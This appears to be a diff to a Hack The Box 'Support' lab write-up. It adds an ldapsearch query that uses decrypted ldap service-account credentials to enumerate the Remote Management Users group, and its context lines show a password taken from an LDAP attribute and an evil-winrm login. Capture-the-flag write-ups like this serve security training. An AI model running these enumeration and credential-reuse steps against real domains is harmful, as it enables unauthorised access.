@@ -101,7 +101,23 @@ internal class Protected
 
 ![](./cyberchef.png)
 
-I decrypted the password and identified it as belonging to the `ldap` service account. I then used these credentials to query Active Directory for information about the `support` user:
+I decrypted the password stored in `UserInfo.exe` and identified it as belonging to the `ldap` service account.
+
+Using these credentials, I queried Active Directory to enumerate members of the `Remote Management Users` group:
+
+```bash
+ldapsearch -x -H ldap://$ip \
+ -D 'ldap@support.htb' \
+ -w '<LDAP_PASSWORD>' \
+ -b "DC=support,DC=htb" \
+ "(cn=Remote Management Users)"
+```
+
+```text
+member: CN=support,CN=Users,DC=support,DC=htb
+```
+
+The results revealed that the `support` user was a member of the `Remote Management Users` group. I queried the user's LDAP attributes to find additional information:
 
 ```bash
 ldapsearch -x -H ldap\://$ip \
@@ -114,7 +130,6 @@ ldapsearch -x -H ldap\://$ip \
 The `info` attribute contained the password for the `support` user.
 
 Using these credentials, I connected to the target through WinRM:
-
 ```bash
 evil-winrm -i $ip -u 'support' -p '************************'
 ```
